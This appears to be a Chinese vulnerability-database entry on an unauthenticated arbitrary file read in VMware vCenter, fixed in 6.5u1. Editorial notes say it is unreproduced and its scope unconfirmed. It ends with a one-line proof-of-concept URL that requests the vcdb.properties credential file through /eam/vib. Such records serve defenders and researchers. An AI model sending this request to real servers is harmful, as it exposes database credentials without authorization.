---
source: "历史归档批(无原始出处标注)"
title: "VMware vCenter未授权任意文件读取"
product: "VMware vCenter"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
source_url: "https://twitter.com/ptswarm/status/1316016337550938122"
source_status: "recorded"
prerequisites: "原文未完整说明身份权限、部署配置和可达性；不能假定匿名、默认开启或所有版本适用。"
side_effects: "原文未完整记录副作用、清理步骤或运行验证；阅读样例不等于获准在真实系统执行。"
id: "vw-b7b06e0be7a2819b5c99aa49"
entity_id: "ve-b7b06e0be7a2819b5c99aa49"
schema_version: "1"
---

# VMware vCenter未授权任意文件读取

<!-- vulwiki-editorial:start -->
## 校订与适用边界

原文保留了 ptswarm 原始研究链接，并非完全无出处。修复于 6.5u1 是原文声明，具体受影响平台和上界仍需该研究及厂商说明确认。


### 本次正文校订

- 修复请求中文件扩展名截断。

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- 6.5u1已修复但缺明确受影响范围和平台
- 匿名读取需核原研究，图片未视检

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

### 原文链接

> https://twitter.com/ptswarm/status/1316016337550938122

在VMware vCenter中发现了一个未经身份验证的任意文件读取漏洞。VMware透露此漏洞已在6.5u1中修复，但未分配CVE

![img](./.resource/VMwarevCenter未授权任意文件读取/media/640-20201014105633643.jpeg)



***\*POC\**:**

```
http://x.x.x.x/eam/vib?id=c:\programData\Vmware\vCenterServer\cfg\vmware-vpx\vcdb.properties
```
